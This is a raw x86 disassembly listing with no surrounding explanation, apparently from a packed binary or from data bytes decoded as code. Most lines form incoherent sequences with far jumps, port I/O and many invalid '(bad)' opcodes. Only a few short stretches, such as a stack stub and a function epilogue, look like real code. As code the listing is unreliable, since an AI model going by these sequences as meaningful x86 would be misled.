  411b38:	les    esi,FWORD PTR [ecx]
  411b3a:	enter  0xe847,0x8a
  411b3e:	cmc    
  411b3f:	push   eax
  411b40:	pop    ds
  411b41:	std    
  411b42:	dec    ebp
  411b43:	cli    
  411b44:	data16 icebp 
  411b46:	inc    edx
  411b47:	push   ebp
  411b48:	pop    ecx
  411b49:	jg     0x411b61
  411b4b:	cmp    esi,DWORD PTR [edx]
  411b4d:	mov    ecx,0xbfe3a6db
  411b52:	push   0xbfd1e59c
  411b57:	and    eax,0xd76f8967
  411b5c:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b5e:	mov    dl,0xe4
  411b60:	les    ecx,FWORD PTR [eax-0x65667d9f]
  411b66:	or     al,BYTE PTR [eax-0x28a51fec]
  411b6c:	scas   al,BYTE PTR es:[edi]
  411b6d:	pmaxsw mm3,mm6
  411b70:	jno    0x411bdc
  411b72:	pusha  
  411b73:	rcr    BYTE PTR [esi-0x65],cl
  411b76:	mov    edx,DWORD PTR [edi+edi*1+0x49]
  411b7a:	lea    ebx,[ebx]
  411b7c:	and    al,0x25
  411b7e:	dec    esp
  411b7f:	pop    edi
  411b80:	aaa    
  411b81:	dec    ecx
  411b82:	iret   
  411b83:	pop    ebx
  411b84:	out    0x3d,eax
  411b86:	jge    0x411b38
  411b88:	adc    cl,BYTE PTR [ebp+0x67b73c7c]
  411b8e:	mov    ebx,0x11fec0f3
  411b93:	pop    ss
  411b94:	ret    
  411b95:	mov    edi,0xc38198d6
  411b9a:	xor    al,0x9e
  411b9c:	mov    al,ds:0xd688ec33
  411ba1:	and    edi,DWORD PTR [esp+ebx*1-0x62750453]
  411ba8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ba9:	jb     0x411b50
  411bab:	dec    edi
  411bac:	add    al,0x40
  411bae:	inc    BYTE PTR [ecx+0x1a]
  411bb1:	dec    esp
  411bb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411bb3:	push   es
  411bb4:	adc    BYTE PTR [eax],dl
  411bb6:	cs jne 0x411bfd
  411bb9:	scas   al,BYTE PTR es:[edi]
  411bba:	rcr    bh,1
  411bbc:	xsha256 (bad)
  411bbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411bbe:	adc    esi,DWORD PTR [eax-0x29]
  411bc1:	popa   
  411bc2:	pop    ecx
  411bc3:	jp     0x411b4f
  411bc5:	xor    cl,BYTE PTR [eax-0x1]
  411bc8:	arpl   WORD PTR [ecx+0x5a],bp
  411bcb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411bcc:	(bad)  
  411bcd:	in     al,0xa2
  411bcf:	xchg   ebx,edi
  411bd1:	frstor ds:0xe778a0ea
  411bd7:	jmp    0x945e:0xbbfdbcef
  411bde:	add    bh,al
  411be0:	pop    ecx
  411be1:	adc    ecx,ebp
  411be3:	mov    edx,0x653c17f4
  411be8:	add    ecx,eax
  411bea:	mov    dl,0xd6
  411bec:	mov    ds:0x5ae864d4,al
  411bf1:	(bad)  
  411bf2:	shl    DWORD PTR [esi+0x49d5a952],cl
  411bf8:	xor    BYTE PTR [ebx+0x3f],dh
  411bfb:	call   0xeb85:0xf0ea279b
  411c02:	in     al,0xab
  411c04:	ds inc edi
  411c06:	mov    ds:0x8d483e57,eax
  411c0b:	adc    al,0x6
  411c0d:	data16 or al,0xc7
  411c10:	and    BYTE PTR [edi],al
  411c12:	lds    esi,FWORD PTR [ebp-0x6b]
  411c15:	pusha  
  411c16:	pop    edi
  411c17:	loop   0x411c8a
  411c19:	fldenv [ebp+0x959f5f5]
  411c1f:	or     ch,ah
  411c21:	jmp    0x411c3f
  411c23:	stos   DWORD PTR es:[edi],eax
  411c24:	sbb    edx,DWORD PTR [edx+0x4447ab58]
  411c2a:	jg     0x411c7a
  411c2c:	add    al,0x91
  411c2e:	out    0x4a,al
  411c30:	jle    0x411ca2
  411c32:	and    al,0xab
  411c34:	xchg   DWORD PTR [edi+0x69],ebx
  411c37:	imul   esi,DWORD PTR [ebp-0x7a1ea9fb],0x5e
  411c3e:	and    DWORD PTR [esi+ebp*1-0x7bb424c1],edi
  411c45:	or     edi,DWORD PTR [ebp+0x7979b121]
  411c4b:	mov    WORD PTR [ecx+0xb],es
  411c4e:	push   0x2d
  411c50:	in     al,0xbc
  411c52:	ds jmp 0x411c3c
  411c55:	popa   
  411c56:	sbb    al,0xae
  411c58:	outs   dx,DWORD PTR ds:[esi]
  411c59:	scas   al,BYTE PTR es:[edi]
  411c5a:	pop    ebp
  411c5b:	add    edi,0x6
  411c5e:	(bad)  
  411c60:	add    edi,DWORD PTR [eax]
  411c62:	repnz bound esi,QWORD PTR [esi]
  411c65:	iret   
  411c66:	pop    edx
  411c67:	cmp    ecx,DWORD PTR cs:[ecx+0x51e1bb17]
  411c6e:	pcmpeqd mm0,QWORD PTR [edx]
  411c71:	push   ds
  411c72:	imul   ecx,DWORD PTR [edx],0x95eea52a
  411c78:	and    edx,DWORD PTR [eax+0x0]
  411c7b:	and    eax,0x8e7275d8
  411c80:	cmp    DWORD PTR ds:0x40fa7a8c,ebx
  411c86:	ret    
  411c87:	and    BYTE PTR [esi+0x4d0bc874],bh
  411c8d:	mov    DWORD PTR cs:[ebp+ebx*1+0x3b6dcb44],ecx
  411c95:	test   eax,0x20f96521
  411c9a:	pusha  
  411c9b:	jno    0x411d0e
  411c9d:	icebp  
  411c9e:	and    bh,BYTE PTR [esi+0x6a1b1261]
  411ca4:	inc    ebx
  411ca5:	add    al,0x48
  411ca7:	mov    edx,0x2f2bf9ac
  411cac:	hlt    
  411cad:	and    edi,0xb2a409e8
  411cb3:	inc    ecx
  411cb4:	popf   
  411cb5:	nop
  411cb6:	add    esi,DWORD PTR [ebx]
  411cb8:	or     eax,0xd52b5b6d
  411cbd:	mov    al,ds:0x3e3e936a
  411cc2:	sbb    al,0xcc
  411cc4:	xchg   DWORD PTR [ebp-0x393320ab],esi
  411cca:	mov    ebx,0xccb5f035
  411ccf:	inc    ebp
  411cd0:	inc    eax
  411cd1:	ins    BYTE PTR es:[edi],dx
  411cd2:	add    ch,ah
  411cd4:	in     eax,0xd9
  411cd6:	jb     0x411c80
  411cd8:	(bad)
  411cdb:	ret    0x6e89
  411cde:	mov    ch,0x63
  411ce0:	loope  0x411cbe
  411ce2:	sbb    BYTE PTR [ebp-0x14],0xd4
  411ce6:	out    0xe,eax
  411ce8:	ds test bl,bl
  411ceb:	ret    
  411cec:	pop    ebx
  411ced:	cwde   
  411cee:	cmp    BYTE PTR [bp+si-0x59c6],bh
  411cf3:	dec    esp
  411cf4:	cli    
  411cf5:	pusha  
  411cf6:	int    0xf9
  411cf8:	push   eax
  411cf9:	cmc    
  411cfa:	pop    ebx
  411cfb:	push   edx
  411cfc:	in     al,0x8a
  411cfe:	inc    ebp
  411d00:	(bad)  
  411d01:	rcl    bl,1
  411d03:	in     eax,0x6
  411d05:	fnstsw WORD PTR [ecx+0x4c]
  411d08:	dec    edi
  411d09:	xor    esp,DWORD PTR [ebx-0x288f1bcc]
  411d0f:	gs sbb eax,0x7aaf4a9
  411d15:	dec    ecx
  411d16:	add    al,0x3
  411d18:	mov    ch,0xf
  411d1a:	mov    WORD PTR [edi+edi*4+0x46],ss
  411d1e:	push   edi
  411d1f:	xor    esp,DWORD PTR [ecx-0x1c205d3f]
  411d25:	ins    DWORD PTR es:[edi],dx
  411d26:	mov    eax,0x6ebea08d
  411d2b:	cmp    DWORD PTR [esi-0x5ac46b88],ebp
  411d31:	out    dx,eax
  411d32:	aas    
  411d33:	xchg   edi,eax
  411d34:	mov    eax,0x4e66d847
  411d39:	xor    eax,0xeaf3d42f
  411d3e:	test   DWORD PTR [ebp+0x1ec17d7a],esp
  411d44:	xchg   ecx,eax
  411d45:	push   eax
  411d46:	aas    
  411d47:	mov    edi,DWORD PTR [ebx]
  411d49:	mov    bl,0xd3
  411d4b:	in     al,0x49
  411d4d:	jnp    0x411d05
  411d4f:	scas   al,BYTE PTR es:[edi]
  411d50:	aad    0x33
  411d52:	xchg   ebp,eax
  411d53:	out    dx,eax
  411d54:	xor    ah,al
  411d56:	cwde   
  411d57:	pop    ebx
  411d58:	jno    0x411d19
  411d5a:	arpl   WORD PTR [esi+0x12],si
  411d5d:	pop    ss
  411d5e:	dec    ebp
  411d5f:	mov    ebp,0x210c5eda
  411d64:	mov    ds:0x3bcf078a,al
  411d69:	popf   
  411d6a:	or     DWORD PTR [edi],eax
  411d6c:	aam    0x1e
  411d6e:	das    
  411d6f:	or     eax,0x27c03855
  411d74:	lea    eax,[eax+0x2d7b5959]
  411d7a:	pop    ebp
  411d7b:	mov    al,ds:0xfb01d897
  411d80:	pushf  
  411d81:	in     al,dx
  411d82:	dec    ecx
  411d83:	lock cwde 
  411d85:	fidivr DWORD PTR [ebx-0x4c]
  411d88:	test   BYTE PTR ss:[eax+0x639bc1b1],ah
  411d8f:	fstp   DWORD PTR [ebp-0x5cfe2dc3]
  411d95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d96:	out    dx,al
  411d97:	and    al,0x3b
  411d99:	icebp  
  411d9a:	aas    
  411d9b:	mov    WORD PTR [si+0x45],ss
  411d9f:	mov    al,ds:0x2e6d758c
  411da4:	cmp    esp,ebx
  411da6:	inc    esp
  411da7:	xchg   ebp,eax
  411da8:	mov    edx,0x7bcd0d57
  411dad:	scas   eax,DWORD PTR es:[edi]
  411dae:	outs   dx,BYTE PTR ds:[esi]
  411daf:	arpl   WORD PTR [ebp-0x67],ax
  411db2:	repnz xlat BYTE PTR ds:[ebx]
  411db4:	es cwde 
  411db6:	mov    dh,0xe0
  411db8:	fisubr DWORD PTR [eax-0x3]
  411dbb:	mov    bh,0x8f
  411dbd:	nop
  411dbe:	adc    al,BYTE PTR [edx-0x3a4ac740]
  411dc4:	(bad)  
  411dc5:	push   ebx
  411dc6:	jae    0x411e39
  411dc8:	mov    edi,0x98779904
  411dcd:	sub    esi,DWORD PTR [eax-0x68]
  411dd0:	fcomp  QWORD PTR [ebp-0x7e]
  411dd3:	add    ch,ch
  411dd5:	push   cs
  411dd6:	jnp    0x411e06
  411dd8:	xchg   dl,ch
  411dda:	mov    ch,0xb7
  411ddc:	xchg   edi,eax
  411ddd:	push   esi
  411dde:	sub    bl,ah
  411de0:	int3   
  411de1:	mov    WORD PTR [ecx-0x2],fs
  411de4:	mov    eax,ds:0x84e51751
  411de9:	push   0xffffffeb
  411deb:	popa   
  411dec:	dec    esi
  411ded:	repnz cld 
  411def:	push   ebx
  411df0:	push   0x4a
  411df2:	sub    eax,0x1f5d04dc
  411df7:	int    0x8e
  411df9:	sbb    DWORD PTR [esi+0x44],ebx
  411dfc:	or     ebx,DWORD PTR [edi+0x1]
  411dff:	push   ebp
  411e00:	sbb    BYTE PTR [esi-0x1f],al
  411e03:	xor    cl,cl
  411e05:	iret   
  411e06:	nop
  411e07:	call   0x4f04:0x50106bff
  411e0e:	jo     0x411d92
  411e10:	and    dh,ch
  411e12:	imul   esp,DWORD PTR [eax],0x186e0e62
  411e18:	pop    ebp
  411e19:	loopne 0x411e0d
  411e1b:	arpl   si,si
  411e1d:	lock jnp 0x411dab
  411e20:	xchg   ebx,ecx
  411e22:	sub    ebx,ecx
  411e24:	xchg   ebx,ecx
  411e26:	dec    ecx
  411e27:	mov    eax,DWORD PTR [ebp-0x1c]
  411e2a:	imul   eax,ecx
  411e2d:	add    esp,eax
  411e2f:	xchg   edx,eax
  411e30:	push   eax
  411e31:	xor    ebx,ebx
  411e33:	mov    edx,esp
  411e35:	dec    edx
  411e36:	inc    ebx
  411e37:	add    ebx,DWORD PTR [edx+ebx*1]
  411e3a:	jmp    0x41222e
  411e3f:	jp     0x411dc5
  411e41:	jb     0x411ea0
  411e43:	jb     0x411eb2
  411e45:	adc    DWORD PTR [ebx-0xc],esp
  411e48:	sub    ebp,DWORD PTR [esi]
  411e4a:	cmc    
  411e4b:	xchg   edx,eax
  411e4c:	sub    DWORD PTR [ecx+0x70481072],0x70
  411e53:	dec    ecx
  411e54:	jge    0x411ec6
  411e56:	jo     0x411e30
  411e58:	xchg   edx,eax
  411e59:	test   eax,0x78abe690
  411e5e:	loope  0x411ed2
  411e60:	pop    ecx
  411e61:	hlt    
  411e62:	push   edi
  411e63:	or     ebp,DWORD PTR [edi]
  411e65:	mov    eax,ds:0xd25ceb18
  411e6a:	xor    DWORD PTR [ecx+0x51],esi
  411e6d:	jmp    0x8e6a:0xff8903ac
  411e74:	outs   dx,DWORD PTR ds:[esi]
  411e75:	pop    edi
  411e76:	(bad)  
  411e78:	enter  0x85cc,0xe7
  411e7c:	or     esp,DWORD PTR [edi+0xf84c30d]
  411e82:	mov    DWORD PTR [edx],ecx
  411e84:	xchg   edi,eax
  411e85:	xchg   ebx,eax
  411e86:	push   eax
  411e87:	sub    cl,bh
  411e89:	loopne 0x411ecd
  411e8b:	sbb    ah,BYTE PTR [edx+esi*8-0x20df1295]
  411e92:	icebp  
  411e93:	sub    eax,0x21b17ea3
  411e98:	fwait
  411e99:	and    DWORD PTR [ebx-0x2c],ecx
  411e9c:	mov    eax,ds:0x142c59b1
  411ea1:	(bad)
  411ea5:	add    al,bh
  411ea7:	loope  0x411eaa
  411ea9:	cmp    al,0x20
  411eab:	test   DWORD PTR [edx-0x14],ebx
  411eae:	push   ds
  411eaf:	psubb  mm4,QWORD PTR [esi+0x8]
  411eb3:	test   al,0x65
  411eb5:	popa   
  411eb6:	push   0xffffffd2
  411eb8:	pop    ss
  411eb9:	sti    
  411eba:	mov    ecx,0x2ab1db25
  411ebf:	xlat   BYTE PTR ds:[ebx]
  411ec0:	push   esp
  411ec1:	(bad)  
  411ec3:	ret    0xb622
  411ec6:	push   ds
  411ec7:	ins    DWORD PTR es:[edi],dx
  411ec8:	sbb    BYTE PTR ss:[ecx],ch
  411ecb:	jns    0x411ed1
  411ecd:	sub    bl,BYTE PTR fs:[edi-0x2c]
  411ed1:	das    
  411ed2:	das    
  411ed3:	mov    dl,0x31
  411ed5:	jbe    0x411ee3
  411ed7:	loop   0x411e5e
  411ed9:	pop    ebx
  411eda:	jnp    0x411e68
  411edc:	sbb    DWORD PTR [ebx],edi
  411ede:	add    eax,0x9430e3
  411ee3:	add    eax,0x6648271b
  411ee8:	xchg   esi,eax
  411ee9:	push   ebp
  411eea:	fst    st(7)
  411eec:	adc    DWORD PTR [edi],0x6f7e6b2
  411ef2:	fisttp DWORD PTR [edx]
  411ef4:	mov    al,ds:0x571846ba
  411ef9:	inc    ebx
  411efa:	jge    0x411f7b
  411efc:	push   es
  411efd:	retf   0x3e11
  411f00:	inc    eax
  411f01:	xchg   ebp,eax
  411f02:	repz sbb DWORD PTR [ebp+eax*8+0xf],0xffffff90
  411f08:	jb     0x411f6a
  411f0a:	and    DWORD PTR [esi],0x8
  411f0d:	fnstenv [eax+0x2bd4c474]
  411f13:	lds    ebp,FWORD PTR [edx+0xf112e3]
  411f19:	(bad)  [ecx]
  411f1b:	cmc    
  411f1c:	or     dl,dh
  411f1e:	xchg   esp,eax
  411f1f:	rcl    DWORD PTR [edi-0x43],0xe0
  411f23:	xchg   ecx,eax
  411f24:	xchg   esi,eax
  411f25:	cmc    
  411f26:	mov    cl,0xcf
  411f28:	and    esp,ebx
  411f2a:	dec    edi
  411f2b:	mov    ecx,0xbd798ca9
  411f30:	std    
  411f31:	pop    edx
  411f32:	daa    
  411f33:	data16 out dx,al
  411f35:	mov    ebx,0x18bb470c
  411f3a:	mov    ebx,0x9fd55d59
  411f3f:	sbb    al,0x26
  411f41:	repz jae 0x411ed3
  411f44:	mov    DWORD PTR [edx-0x14],eax
  411f47:	push   edx
  411f48:	jle    0x411ed9
  411f4a:	outs   dx,BYTE PTR ds:[esi]
  411f4b:	repz sub edx,DWORD PTR [eax+0x7b]
  411f4f:	(bad)  
  411f50:	aad    0xd3
  411f52:	pop    ds
  411f53:	or     bl,BYTE PTR [eax+0x107a924e]
  411f59:	out    0xdf,al
  411f5b:	ret    0x52ff
  411f5e:	push   edi
  411f5f:	mul    BYTE PTR [edx-0x1d]
  411f62:	(bad)  
  411f63:	ss pop ebx
  411f65:	sbb    dl,cl
  411f67:	cwde   
  411f68:	push   ebx
  411f69:	leave  
  411f6a:	xchg   DWORD PTR [ecx-0x745f96e0],edx
  411f70:	fucomip st,st(3)
  411f72:	aam    0x67
  411f74:	jmp    0x9ca7:0x1d1ce9bc
  411f7b:	and    ah,BYTE PTR [edx]
  411f7d:	dec    ebp
  411f7e:	cwde   
  411f7f:	sbb    dl,dh
  411f81:	dec    ecx
  411f82:	pop    esp
  411f83:	out    dx,eax
  411f84:	ja     0x411f85
  411f86:	aad    0x85
  411f88:	push   eax
  411f89:	mov    al,0x31
  411f8b:	bound  edi,QWORD PTR [edx-0x2a]
  411f8e:	inc    esp
  411f8f:	std    
  411f90:	fs int 0x5a
  411f93:	or     bh,BYTE PTR [esi+0x7f]
  411f96:	stc    
  411f97:	fld    QWORD PTR [eax+0x11]
  411f9a:	sub    eax,0xbd3e452e
  411f9f:	and    ebp,ebx
  411fa1:	mov    dl,0xdd
  411fa3:	push   es
  411fa4:	dec    edi
  411fa5:	or     eax,DWORD PTR [ebx+0x5e89f676]
  411fab:	cmp    edi,esp
  411fad:	mov    esi,0x6b16b6c1
  411fb2:	sbb    BYTE PTR [edi+eiz*8+0x2b],ah
  411fb6:	int3   
  411fb7:	xor    ebx,esp
  411fb9:	ret    0x56e4
  411fbc:	ret    
  411fbd:	aad    0x2e
  411fbf:	push   esi
  411fc0:	rcl    bl,0xa
  411fc3:	add    BYTE PTR [ecx-0x43],ah
  411fc6:	add    eax,0x344b4641
  411fcb:	sbb    esi,0x50
  411fce:	sar    BYTE PTR [edi+edi*1-0x28],0x47
  411fd3:	faddp  st(0),st
  411fd5:	sbb    BYTE PTR [ebp-0x6a73a577],dh
  411fdb:	inc    edi
  411fdc:	jbe    0x412048
  411fde:	push   ebp
  411fdf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411fe0:	dec    ebp
  411fe1:	jp     0x412018
  411fe3:	lea    ecx,[ebx]
  411fe5:	pusha  
  411fe6:	push   es
  411fe7:	push   ebx
  411fe8:	jge    0x412019
  411fea:	sar    BYTE PTR es:[edi+esi*2],0x13
  411fef:	shr    edi,0xbb
  411ff2:	int3   
  411ff3:	lock pushf 
  411ff5:	int    0x3c
  411ff7:	(bad)  
  411ff8:	jge    0x412021
  411ffa:	cmc    
  411ffb:	mov    dh,0x65
  411ffd:	adc    eax,0xafe83d90
  412002:	in     eax,0x31
  412004:	call   0x2a6ecba9
  412009:	push   ebp
  41200a:	sub    eax,0xd00217d5
  41200f:	add    DWORD PTR [esi+ebx*1],ebx
  412012:	clc    
  412013:	out    dx,eax
  412014:	imul   esp,DWORD PTR [esi-0x2b],0xef56b31c
  41201b:	jns    0x411ff1
  41201d:	mov    ebp,0x9f5df323
  412022:	nop
  412023:	mov    BYTE PTR [eax],cl
  412025:	mov    al,0x4b
  412027:	ror    ch,1
  412029:	xchg   ebp,eax
  41202a:	repnz or BYTE PTR [eax],bh
  41202d:	enter  0x5a,0x3c
  412031:	jecxz  0x411ffe
  412033:	sub    al,0x30
  412035:	jno    0x411fe9
  412037:	xchg   DWORD PTR [ebx-0x74e562cc],esp
  41203d:	push   ss
  41203e:	fild   DWORD PTR [edx+0x3b]
  412041:	xchg   eax,eax
  412043:	in     eax,0x36
  412045:	add    ebx,ecx
  412047:	in     eax,dx
  412048:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412049:	push   ebp
  41204a:	mov    ecx,0xfa4a66d3
  41204f:	mov    ss,WORD PTR [eax+0x44]
  412052:	adc    ebp,DWORD PTR [eax-0x7a]
  412055:	inc    ecx
  412056:	clc    
  412057:	jg     0x4120d0
  412059:	sar    DWORD PTR [ecx+0x4e],0xbe
  41205d:	cld    
  41205e:	jb     0x412017
  412060:	je     0x412091
  412062:	out    dx,al
  412063:	pop    edi
  412064:	fild   QWORD PTR [ebp+0x68]
  412067:	cs and eax,0x673adb33
  41206d:	aas    
  41206e:	mov    BYTE PTR [edi],ah
  412070:	retf   
  412071:	add    esp,DWORD PTR [ecx]
  412073:	je     0x4120d1
  412075:	test   al,0x26
  412077:	sub    dh,BYTE PTR [eax+0x703b984c]
  41207d:	dec    eax
  41207e:	sub    ebx,DWORD PTR [ecx+0x38]
  412081:	cli    
  412082:	jns    0x412061
  412084:	aas    
  412085:	push   ebp
  412086:	push   esi
  412087:	popf   
  412088:	icebp  
  412089:	(bad)
  41208c:	(bad)  
  41208d:	loopne 0x412012
  41208f:	mov    ebx,0x7b88be10
  412094:	push   di
  412096:	in     al,dx
  412097:	xchg   ecx,eax
  412098:	sar    bh,0x29
  41209b:	aas    
  41209c:	popa   
  41209d:	mov    ah,0xb5
  41209f:	dec    edi
  4120a0:	xlat   BYTE PTR ds:[ebx]
  4120a1:	adc    BYTE PTR [ebx-0x73b1487],bl
  4120a7:	in     al,dx
  4120a8:	push   ss
  4120a9:	push   es
  4120aa:	sbb    bh,BYTE PTR [esi*4-0x3dad490e]
  4120b1:	aad    0xe2
  4120b3:	mov    ds:0xd866d1a7,eax
  4120b8:	mov    ah,0xa4
  4120ba:	mov    bl,0x2b
  4120bc:	repz jo 0x41211c
  4120bf:	mov    DWORD PTR [edi],ebp
  4120c1:	das    
  4120c2:	dec    edx
  4120c3:	icebp  
  4120c4:	test   ah,cl
  4120c6:	iret   
  4120c7:	and    edx,DWORD PTR [ebp-0x1a8b55c7]
  4120cd:	shr    BYTE PTR [ecx+0x706258aa],cl
  4120d3:	cmp    esi,DWORD PTR [eax+0x7df7ce8]
  4120d9:	or     esi,ecx
  4120db:	xchg   al,al
  4120dd:	bound  edi,QWORD PTR [ebx-0x18fb8fc0]
  4120e3:	repnz scas al,BYTE PTR es:[edi]
  4120e5:	mov    ch,0x19
  4120e7:	fcmovnbe st,st(3)
  4120e9:	xor    DWORD PTR [ecx-0x38f9e2e1],ecx
  4120ef:	jne    0x4120fc
  4120f1:	push   ss
  4120f2:	hlt    
  4120f3:	jo     0x4120ba
  4120f5:	jns    0x41207e
  4120f7:	inc    edi
  4120f8:	xor    bl,bl
  4120fa:	xchg   esi,eax
  4120fb:	call   0x27dcf9cf
  412100:	fwait
  412101:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412102:	sub    esi,edx
  412104:	cld    
  412105:	add    ah,BYTE PTR [ebp+0x22874e4]
  41210b:	icebp  
  41210c:	sbb    DWORD PTR [esp+ebp*1],eax
  41210f:	pusha  
  412110:	enter  0xdd52,0x44
  412114:	cmc    
  412115:	lods   eax,DWORD PTR ds:[esi]
  412116:	dec    eax
  412117:	mov    ebp,0xadd0642d
  41211c:	lahf   
  41211d:	dec    ebx
  41211e:	les    edi,FWORD PTR [edx+0x5c542c3c]
  412124:	add    BYTE PTR [eax],dh
  412126:	call   0xebeca371
  41212b:	xor    BYTE PTR [eax+edi*2],ch
  41212e:	lahf   
  41212f:	mov    cl,0xd8
  412131:	sub    al,0xd3
  412133:	and    al,0xe2
  412135:	mov    ah,0xe8
  412137:	dec    ecx
  412138:	jmp    0x6eebce3
  41213d:	loopne 0x41212f
  41213f:	and    eax,0x81b2ef97
  412144:	sbb    ecx,DWORD PTR [edi+0x407b8f0f]
  41214a:	stc    
  41214b:	xchg   edi,eax
  41214c:	in     al,0x83
  41214e:	aaa    
  41214f:	(bad)  
  412150:	lds    ecx,FWORD PTR [eax-0x5cbbbf3a]
  412156:	xchg   ebp,eax
  412157:	or     BYTE PTR [ebx],bl
  412159:	lods   eax,DWORD PTR ds:[esi]
  41215a:	cdq    
  41215b:	(bad)  
  41215c:	jmp    DWORD PTR [eax+0x6e91ae09]
  412162:	or     ebp,DWORD PTR [esi-0x42e98b3]
  412168:	sbb    eax,ebp
  41216a:	inc    esi
  41216b:	or     al,0x7d
  41216d:	aam    0x1d
  41216f:	daa    
  412170:	xor    dl,BYTE PTR [esi-0x80]
  412173:	ficomp WORD PTR [esi]
  412175:	ja     0x4121af
  412177:	mov    ecx,0xe8ca1a99
  41217c:	pop    ebp
  41217d:	dec    esi
  41217e:	push   ss
  41217f:	inc    esi
  412180:	or     eax,DWORD PTR [esp+ebp*4+0x593a4c85]
  412187:	pop    ebx
  412188:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412189:	adc    al,0xa8
  41218b:	mov    esp,0x6e19f505
  412190:	sub    ebx,DWORD PTR [edi]
  412192:	xchg   ebx,eax
  412193:	ret    
  412194:	adc    DWORD PTR [edx-0x3dfe5b07],0xaefa9a8d
  41219e:	pop    ecx
  41219f:	sub    eax,0x67e91dbb
  4121a4:	mov    dl,0x81
  4121a6:	mov    edi,0x73c83be6
  4121ab:	pop    ss
  4121ac:	adc    BYTE PTR [ebx],dh
  4121ae:	mov    ah,0xae
  4121b0:	imul   esp,DWORD PTR [edi],0x201e4649
  4121b6:	or     ah,BYTE PTR [eax+0x5d56acc1]
  4121bc:	fadd   st,st(2)
  4121be:	inc    eax
  4121bf:	jge    0x412142
  4121c1:	inc    ecx
  4121c2:	jbe    0x412184
  4121c4:	dec    edi
  4121c5:	mov    ah,0x87
  4121c7:	and    ebp,DWORD PTR [ecx-0x57]
  4121ca:	mov    eax,ds:0x4000643f
  4121cf:	repz fninit 
  4121d2:	mov    al,0xfe
  4121d4:	hlt    
  4121d5:	xor    ch,BYTE PTR [eax]
  4121d7:	cmp    al,BYTE PTR [ebx+0x56]
  4121da:	stos   DWORD PTR es:[edi],eax
  4121db:	es dec ebx
  4121dd:	leave  
  4121de:	test   eax,0x6d1a3428
  4121e3:	iret   
  4121e4:	push   edx
  4121e5:	fs ins BYTE PTR es:[edi],dx
  4121e7:	jmp    0xe8a7d8c4
  4121ec:	sti    
  4121ed:	sub    BYTE PTR [eax+0x55],ah
  4121f0:	pop    ebx
  4121f1:	mov    ?,eax
  4121f3:	(bad)  
  4121f4:	rol    DWORD PTR [edi-0x78],1
  4121f7:	mov    esi,0x45fd0654
  4121fc:	add    dh,BYTE PTR cs:[eax+0x4cd291a2]
  412203:	or     edi,DWORD PTR [edi]
  412205:	mov    bl,0xe9
  412207:	sbb    eax,0x2d0c3b3c
  41220d:	outs   dx,WORD PTR ds:[esi]
  41220f:	push   ecx
  412210:	ror    BYTE PTR [esi-0x46],1
  412213:	sbb    eax,0x80675a96
  412218:	js     0x412258
  41221a:	pop    ebx
  41221b:	out    dx,eax
  41221c:	cli    
  41221d:	cmp    al,0x35
  41221f:	ret    0x9c0b
  412222:	mov    WORD PTR [esi+0x4928a140],fs
  412228:	bound  ebp,QWORD PTR [ecx-0x5318cdd0]
  41222e:	dec    ebx
  41222f:	xor    edx,edx
  412231:	add    DWORD PTR [ebp-0xc],ebx
  412234:	pop    ebx
  412235:	mov    eax,DWORD PTR [ebp-0xc]
  412238:	pop    edi
  412239:	pop    esi
  41223a:	pop    ebx
  41223b:	leave  
  41223c:	ret    0x10
  41223f:	dec    ebp
  412240:	push   ebp
  412241:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  412247:	mov    esp,ebp
  412249:	or     ah,dh
  41224b:	dec    ebp
  41224c:	add    bh,al
  41224e:	add    BYTE PTR [eax],cl
  412250:	add    BYTE PTR [eax],al
  412252:	mov    DWORD PTR [eax],0x40f44545
  412258:	xor    DWORD PTR [eax],eax
  41225a:	test   DWORD PTR [ebx-0x34070b64],ecx
  412260:	(bad)  
  412261:	enter  0x4d45,0xbc
  412265:	mov    esi,DWORD PTR [eax]
  412267:	hlt    
  412268:	test   ebx,ecx
  41226a:	pushf  
  41226b:	enter  0x4df8,0x8b
  41226f:	mov    DWORD PTR [ebp-0x20],0x890208
  412276:	inc    ebp
  412277:	inc    ebp
  412278:	cld    
  412279:	xor    cl,BYTE PTR [ebx-0xb38b300]
  41227f:	or     BYTE PTR [ebx+0x0],dl
  412282:	mov    ebx,0x8bd5500
  412287:	call   DWORD PTR [ecx-0x1]
  41228a:	pop    es
  41228b:	mov    ch,0x33
  41228d:	dec    ebx
  41228f:	(bad)  
  412290:	mov    eax,0x72009ca4
  412295:	push   DWORD PTR [edx]
  412297:	or     BYTE PTR [eax],al
  412299:	jmp    0xff89:0x75c84d03
  4122a0:	dec    ebp
  4122a1:	loopne 0x412273
  4122a3:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  4122a9:	add    BYTE PTR [ebx],dh
  4122ab:	mov    ecx,ebx
  4122ad:	hlt    
  4122ae:	add    ecx,ebx
  4122b0:	enter  0x899c,0x32
  4122b4:	dec    ebp
  4122b5:	add    ecx,eax
  4122b7:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  4122bd:	or     DWORD PTR [ebx-0xb00b29c],0x0
  4122c4:	xor    ecx,ebx
  4122c6:	retf   
  4122c7:	enter  0x4d03,0xc8
  4122cb:	mov    DWORD PTR fs:[eax],ebx
  4122ce:	lea    eax,[eax]
  4122d0:	push   esp
  4122d1:	mov    edi,edi
  4122d3:	fs (bad) 
  4122d5:	(bad)  
  4122d6:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  4122dc:	push   0xffffffff
  4122de:	and    bh,bh
  4122e0:	pop    ecx
  4122e1:	inc    eax
  4122e2:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  4122e8:	push   0xffffff8b
  4122ea:	pop    ecx
  4122eb:	cld    
  4122ec:	dec    ebp
  4122ed:	lea    ecx,[ecx+0x45ff08ff]
  4122f3:	mov    BYTE PTR [edx+0x1],cl
  4122f6:	add    BYTE PTR [eax],al
  4122f8:	mov    DWORD PTR [ebp+0x8],0x58008d
  4122ff:	dec    DWORD PTR [ebp-0x77]
